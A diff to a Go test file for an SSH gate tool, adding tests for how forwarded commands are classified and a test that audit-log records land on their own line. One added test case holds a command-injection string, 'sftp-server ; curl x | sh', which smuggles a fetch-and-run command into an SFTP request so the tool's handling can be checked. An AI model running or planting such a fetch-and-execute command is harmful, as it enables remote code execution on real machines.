@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/json"
 	"os"
 	"path/filepath"
 	"slices"
@@ -38,6 +39,7 @@ func TestInboundRecordsAndExecs(t *testing.T) {
 		"shell":    {map[string]string{"SSH_TTY": "/dev/ttys001"}, "shell", "true", []string{"/bin/zsh", "-l"}},
 		"command":  {map[string]string{"SSH_ORIGINAL_COMMAND": "echo 'secret-token' && ls"}, "command", "false", []string{"/bin/zsh", "-c", "echo 'secret-token' && ls"}},
 		"sftp":     {map[string]string{"SSH_ORIGINAL_COMMAND": "/usr/libexec/sftp-server"}, "sftp", "false", []string{"/bin/zsh", "-c", "/usr/libexec/sftp-server"}},
+		"inject":   {map[string]string{"SSH_ORIGINAL_COMMAND": "/usr/libexec/sftp-server ; curl x | sh"}, "command", "false", []string{"/bin/zsh", "-c", "/usr/libexec/sftp-server ; curl x | sh"}},
 		"internal": {map[string]string{"SSH_ORIGINAL_COMMAND": "internal-sftp"}, "sftp", "false", []string{"/bin/zsh", "-c", "internal-sftp"}},
 	} {
 		t.Run(name, func(t *testing.T) {
@@ -105,5 +107,22 @@ func TestInboundBadName(t *testing.T) {
 	r := &inboundRun{}
 	if err := inbound(`a"b`, func(string) string { return "1.2.3.4 5 1.2.3.5 22" }, nil, r.exec); err == nil || r.execed {
 		t.Fatal("bad name ran")
+	}
+}
+
+func TestInboundEndsATornLine(t *testing.T) {
+	dir := t.TempDir()
+	audit := filepath.Join(dir, "audit.jsonl")
+	if err := os.WriteFile(audit, []byte(`{"kind":"login","dev`), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	env := map[string]string{"SSH_CONNECTION": "1.2.3.4 5 1.2.3.5 22", "SSHGATE_STORE": filepath.Join(dir, "servers.json"), "SSH_ORIGINAL_COMMAND": "id"}
+	if err := inbound("iphone", func(k string) string { return env[k] }, nil, (&inboundRun{}).exec); err != nil {
+		t.Fatal(err)
+	}
+	b, _ := os.ReadFile(audit)
+	lines := strings.Split(strings.TrimSuffix(string(b), "\n"), "\n")
+	if len(lines) != 2 || !json.Valid([]byte(lines[1])) {
+		t.Fatalf("the record is not on its own line: %q", b)
 	}
 }
